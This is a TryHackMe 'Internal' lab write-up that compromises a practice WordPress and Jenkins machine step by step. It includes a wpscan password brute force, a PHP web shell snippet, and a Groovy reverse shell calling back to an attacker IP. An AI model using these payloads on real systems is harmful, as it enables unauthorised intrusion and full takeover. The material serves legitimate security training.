# TryHackMe Machine Internal WriteUp

**IP Address**
```shell
export tip=10.10.215.130
```

**Nmap Scan Results**
```shell
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http
|_http-title: Apache2 Ubuntu Default Page: It works
```

## Enumeration

**HTTP**

***Content-Discovery***
```
blog                    [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 187ms]
wordpress               [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 188ms]
javascript              [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 188ms]
phpmyadmin              [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 190ms]
index.php               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 259ms]
wp-content              [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 191ms]
wp-login.php            [Status: 200, Size: 4530, Words: 211, Lines: 83, Duration: 211ms]
license.txt             [Status: 200, Size: 19915, Words: 3331, Lines: 385, Duration: 186ms]
wp-includes             [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 190ms]
wp-trackback.php        [Status: 200, Size: 135, Words: 11, Lines: 5, Duration: 773ms]
wp-admin                [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 185ms]
xmlrpc.php              [Status: 405, Size: 42, Words: 6, Lines: 1, Duration: 214ms]
wp-signup.php           [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 202ms]
```
Its using a old wordpress framework that are vulnerable to many attacks and `admin` Users have weak password.
```shell
wpscan --url http://internal.thm/blog/wp-login.php --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://internal.thm/blog/wp-login.php/ [10.10.215.130]
[+] Started: Sat Aug 20 14:58:36 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://internal.thm/blog/wp-login.php/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] This site seems to be a multisite
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | Reference: http://codex.wordpress.org/Glossary#Multisite

[+] The external WP-Cron seems to be enabled: http://internal.thm/blog/wp-login.php/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Most Common Wp Includes Query Parameter In Homepage (Passive Detection)
 |  - http://internal.thm/blog/wp-includes/css/dashicons.min.css?ver=5.4.2
 | Confirmed By:
 |  Common Wp Includes Query Parameter In Homepage (Passive Detection)
 |   - http://internal.thm/blog/wp-includes/css/buttons.min.css?ver=5.4.2
 |   - http://internal.thm/blog/wp-includes/js/wp-util.min.js?ver=5.4.2
 |  Query Parameter In Install Page (Aggressive Detection)
 |   - http://internal.thm/blog/wp-includes/css/dashicons.min.css?ver=5.4.2
 |   - http://internal.thm/blog/wp-includes/css/buttons.min.css?ver=5.4.2
 |   - http://internal.thm/blog/wp-admin/css/forms.min.css?ver=5.4.2
 |   - http://internal.thm/blog/wp-admin/css/l10n.min.css?ver=5.4.2
 |
 | [!] 12 vulnerabilities identified:
 |
 | [!] Title: WordPress 4.7-5.7 - Authenticated Password Protected Pages Exposure
 |     Fixed in: 5.4.5
 |     References:
 |      - https://wpscan.com/vulnerability/6a3ec618-c79e-4b9c-9020-86b157458ac5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29450
 |      - https://wordpress.org/news/2021/04/wordpress-5-7-1-security-and-maintenance-release/
 |      - https://blog.wpscan.com/2021/04/15/wordpress-571-security-vulnerability-release.html
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-pmmh-2f36-wvhq
 |      - https://core.trac.wordpress.org/changeset/50717/
 |      - https://www.youtube.com/watch?v=J2GXmxAdNWs
 |
 | [!] Title: WordPress 3.7 to 5.7.1 - Object Injection in PHPMailer
 |     Fixed in: 5.4.6
 |     References:
 |      - https://wpscan.com/vulnerability/4cd46653-4470-40ff-8aac-318bee2f998d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-36326
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19296
 |      - https://github.com/WordPress/WordPress/commit/267061c9595fedd321582d14c21ec9e7da2dcf62
 |      - https://wordpress.org/news/2021/05/wordpress-5-7-2-security-release/
 |      - https://github.com/PHPMailer/PHPMailer/commit/e2e07a355ee8ff36aba21d0242c5950c56e4c6f9
 |      - https://www.wordfence.com/blog/2021/05/wordpress-5-7-2-security-release-what-you-need-to-know/
 |      - https://www.youtube.com/watch?v=HaW15aMzBUM
 |
 | [!] Title: WordPress 5.4 to 5.8 -  Lodash Library Update
 |     Fixed in: 5.4.7
 |     References:
 |      - https://wpscan.com/vulnerability/5d6789db-e320-494b-81bb-e678674f4199
 |      - https://wordpress.org/news/2021/09/wordpress-5-8-1-security-and-maintenance-release/
 |      - https://github.com/lodash/lodash/wiki/Changelog
 |      - https://github.com/WordPress/wordpress-develop/commit/fb7ecd92acef6c813c1fde6d9d24a21e02340689
 |
 | [!] Title: WordPress 5.4 to 5.8 - Authenticated XSS in Block Editor
 |     Fixed in: 5.4.7
 |     References:
 |      - https://wpscan.com/vulnerability/5b754676-20f5-4478-8fd3-6bc383145811
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-39201
 |      - https://wordpress.org/news/2021/09/wordpress-5-8-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-wh69-25hr-h94v
 |
 | [!] Title: WordPress 5.4 to 5.8 - Data Exposure via REST API
 |     Fixed in: 5.4.7
 |     References:
 |      - https://wpscan.com/vulnerability/38dd7e87-9a22-48e2-bab1-dc79448ecdfb
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-39200
 |      - https://wordpress.org/news/2021/09/wordpress-5-8-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/ca4765c62c65acb732b574a6761bf5fd84595706
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-m9hc-7v5q-x8q5
 |
 | [!] Title: WordPress < 5.8.2 - Expired DST Root CA X3 Certificate
 |     Fixed in: 5.4.8
 |     References:
 |      - https://wpscan.com/vulnerability/cc23344a-5c91-414a-91e3-c46db614da8d
 |      - https://wordpress.org/news/2021/11/wordpress-5-8-2-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/ticket/54207
 |
 | [!] Title: WordPress < 5.8 - Plugin Confusion
 |     Fixed in: 5.8
 |     References:
 |      - https://wpscan.com/vulnerability/95e01006-84e4-4e95-b5d7-68ea7b5aa1a8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44223
 |      - https://vavkamil.cz/2021/11/25/wordpress-plugin-confusion-update-can-get-you-pwned/
 |
 | [!] Title: WordPress < 5.8.3 - SQL Injection via WP_Query
 |     Fixed in: 5.4.9
 |     References:
 |      - https://wpscan.com/vulnerability/7f768bcf-ed33-4b22-b432-d1e7f95c1317
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21661
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-6676-cqfm-gw84
 |      - https://hackerone.com/reports/1378209
 |
 | [!] Title: WordPress < 5.8.3 - Author+ Stored XSS via Post Slugs
 |     Fixed in: 5.4.9
 |     References:
 |      - https://wpscan.com/vulnerability/dc6f04c2-7bf2-4a07-92b5-dd197e4d94c8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21662
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-699q-3hj9-889w
 |      - https://hackerone.com/reports/425342
 |      - https://blog.sonarsource.com/wordpress-stored-xss-vulnerability
 |
 | [!] Title: WordPress 4.1-5.8.2 - SQL Injection via WP_Meta_Query
 |     Fixed in: 5.4.9
 |     References:
 |      - https://wpscan.com/vulnerability/24462ac4-7959-4575-97aa-a6dcceeae722
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21664
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-jp3p-gw8h-6x86
 |
 | [!] Title: WordPress < 5.8.3 - Super Admin Object Injection in Multisites
 |     Fixed in: 5.4.9
 |     References:
 |      - https://wpscan.com/vulnerability/008c21ab-3d7e-4d97-b6c3-db9d83f390a7
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21663
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-jmmq-m8p8-332h
 |      - https://hackerone.com/reports/541469
 |
 | [!] Title: WordPress < 5.9.2 - Prototype Pollution in jQuery
 |     Fixed in: 5.4.10
 |     References:
 |      - https://wpscan.com/vulnerability/1ac912c1-5e29-41ac-8f76-a062de254c09
 |      - https://wordpress.org/news/2022/03/wordpress-5-9-2-security-maintenance-release/

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:06 <======================================> (137 / 137) 100.00% Time: 00:00:06

[i] No Config Backups Found.

[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - admin / my2boys                                                                                          
Trying admin / calderon Time: 00:03:23 <                                    > (3900 / 14348292)  0.02%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: admin, Password: my2boys

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 0
 | Requests Remaining: 71

[+] Finished: Sat Aug 20 15:02:15 2022
[+] Requests Done: 4042
[+] Cached Requests: 184
[+] Data Sent: 1.434 MB
[+] Data Received: 19.859 MB
[+] Memory used: 253.984 MB
[+] Elapsed time: 00:03:38
```
We got `admin` users credentials and now we can login with that.

**Private Post have some Credentials**
```
To-Do

Don't forget to reset Will's credentials. william:arnold147
```

## Exploitation

Now we are login so we can edit the php file from the following link like `index.php` with our reverse shell code and by visiting this will give us reverse shell or code execution.
`http://internal.thm/blog/wp-admin/theme-editor.php?file=index.php&theme=twentyseventeen`

By editing and adding `index.php` with the following code I can now run system commands
```
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
```
You can get reverse shell directly but I like this way.

After getting the reverse shell I see `wp-config.php` that file contains MySQL Database credentials and found the following credentials.
```
DB_User: wordpress
DB_Password: wordpress123
```
Using that we can login with MySQL database locally and as there is `phpmyadmin` directory that are GUI version of intracting MySQL database so we can check him also for getting some usefull things.

## POST Exploitation

There are only one user `aubreanna`. And I try every credential I found yet to login with that but no one works. And there is no `SUID` and `Capiblities` binaries there we can use for priv-esc. 

But when i use `ls` command on `/opt` endpoint there is a file name `wp-save.txt` that have some juicy things.
```
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
```
And Its a valid credentials so get connected with `ssh`
In the user home directory there's a file name `jenkins.txt` that have the following content.
```
Internal Jenkins service is running on 172.17.0.2:8080
```
They mentioned there is a `jenkins` server running locally on port `8080` and we can confirm that using `ss -tupln` command. Now we have to do a port forward to access that port and we can do that using ssh port tunneling with following syntax.
```shell
ssh -L local_port:local_address:remote_port username@remote_address
```
So our command looks like this.
```shell
ssh -L 8080:localhost:8080 aubreanna@internal.thm
```
After using the above command they tunel local `jenkins` server port to our local 8080 port so now we can access jenkins server. I try default `admin:admin` credentials but it doesn't work so I try bruteforce attack. The bruteforce may take too much time and we can only guess the credentials by its response size so we have to fillter our result with response size. I try using hydra http-form bruteforce method or some other method they didn't able to guess the password so we have to use `burp intruder` or `zap proxy` or any other method that can fillter with response size. after that we can get the following valid credentials

**Jenkins Server Credentials**
```
admin:spongebob
```
Now we are login to `jenkins` so there are many ways we can get reverse shell back from `jenkins` but I use the `groovy` script method. First I got `/script` endpoint and there we have a groovy script box we can copy paste the following groovy reverse shell scrip there and after running that we can get the reverse shell back. 
```groovy
String host="10.8.186.33";int port=5555;String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
After getting the jenkins reverse shell I again use methods like finding SUID,GUID and capabilities but didn't found anything usefull so i use `ls /opt` command there is a file name `note.txt` that have root user credentials. We can now login to root user accoutn with followings credenitals using ssh 
```
root:tr0ub13guM!@#123
```
```shell
ssh root@internal.thm
password: tr0ub13guM!@#123
```
And we got root user.